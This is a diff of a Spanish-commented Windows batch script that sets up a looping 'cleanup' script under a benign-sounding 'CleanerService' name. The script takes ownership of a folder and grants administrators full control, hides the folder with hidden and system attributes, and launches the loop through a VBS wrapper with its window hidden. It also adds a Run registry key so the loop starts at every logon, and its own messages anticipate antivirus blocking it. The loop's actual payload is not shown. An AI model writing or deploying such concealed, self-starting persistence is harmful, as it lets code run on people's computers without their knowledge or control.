@@ -15,14 +15,26 @@ set "cleanerName=system_cleanup.bat"
 set "vbsName=start_service.vbs"
 
 :: 1. Crear el directorio estratégico
-if not exist "%targetDir%" mkdir "%targetDir%" 2>nul
+echo [*] Paso 1: Verificando existencia de la carpeta...
+if not exist "%targetDir%" (
+    mkdir "%targetDir%" 2>nul
+    echo [+] Carpeta creada exitosamente.
+) else (
+    echo [i] La carpeta ya existe, procediendo a resetear permisos.
+)
 
 :: Forzar toma de posesión y permisos totales
-takeown /f "%targetDir%" /r /d s >nul 2>&1
+echo [*] Paso 2: Forzando toma de posesion y privilegios...
+takeown /f "%targetDir%" /a /r /d s >nul 2>&1
 icacls "%targetDir%" /grant administrators:F /t >nul 2>&1
-attrib +h +s "%targetDir%" /d /s >nul 2>&1
+echo [OK] Permisos concedidos al grupo Administradores.
+
+echo [*] Paso 3: Auditoria de permisos actuales:
+icacls "%targetDir%"
+echo.
 
 :: 2. Crear el script de limpieza (Bucle Infinito)
+echo [*] Paso 4: Creando archivos de servicio...
 echo @echo off > "%targetDir%\%cleanerName%"
 echo set "logFile=%targetDir%\cleanup.log" >> "%targetDir%\%cleanerName%"
 echo :loop >> "%targetDir%\%cleanerName%"
@@ -43,6 +55,9 @@ echo :: Esperar 30 segundos antes de la siguiente revision >> "%targetDir%\%clea
 echo timeout /t 30 /nobreak ^>nul >> "%targetDir%\%cleanerName%"
 echo goto loop >> "%targetDir%\%cleanerName%"
 
+:: Aplicar atributos de oculto despues de crear los archivos
+attrib +h +s "%targetDir%" /d /s >nul 2>&1
+
 :: 3. Crear el script VBS para ejecucion invisible
 echo Set WshShell = CreateObject("WScript.Shell") > "%targetDir%\%vbsName%"
 echo WshShell.Run chr(34) ^& "%targetDir%\%cleanerName%" ^& Chr(34), 0 >> "%targetDir%\%vbsName%"
@@ -53,14 +68,15 @@ echo Set WshShell = Nothing >> "%targetDir%\%vbsName%"
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "CleanerService" /t REG_SZ /d "wscript.exe \"%targetDir%\%vbsName%\"" /f >nul 2>&1
 
 :: 5. Ejecutar ahora mismo de forma invisible
+echo [*] Paso 5: Iniciando servicio en segundo plano...
 start wscript.exe "%targetDir%\%vbsName%"
 
 :: 6. Verificacion de ejecucion
 timeout /t 3 /nobreak >nul
 tasklist /FI "IMAGENAME eq wscript.exe" | find /I "wscript.exe" >nul
 if %errorlevel% equ 0 (
-    echo [OK] El servicio se ha iniciado correctamente.
-    echo Actividad registrada en: %targetDir%\cleanup.log
+    echo [LISTO] El script esta corriendo.
+    echo Logs disponibles en: %targetDir%\cleanup.log
 ) else (
     echo [ERROR] El proceso invisible no inicio. 
     echo Posibles causas: Antivirus bloqueando VBScript o permisos insuficientes en ProgramData.
